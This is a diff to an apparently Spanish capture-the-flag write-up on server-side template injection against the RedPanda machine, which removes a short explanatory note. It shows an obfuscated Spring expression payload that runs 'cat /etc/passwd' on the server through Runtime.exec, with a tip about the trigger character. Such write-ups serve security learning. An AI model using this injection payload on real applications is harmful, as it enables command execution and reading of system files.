@@ -187,9 +187,6 @@ Es probable que no sea tan practico, pero al ejecutarlo nos muestra dos caracter
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 
 
-¿Por qué el anterior payload? Bueno, porque hubieron varios del mismo recurso que no funcionaron, no se ejecutaron.
-{: .prompt-info }
-
 Para usar el anterior payload, debemos cambiar el _\$_ por alguno de los caracteres obtenidos anteriormente. Cuando probamos a usar _\@_ no nos muestra nada, pero al usar el _\*_, obtenemos:
 ![Web redPanda STTI](/assets/favicon/2022-11-26/redPanda4.png)
 
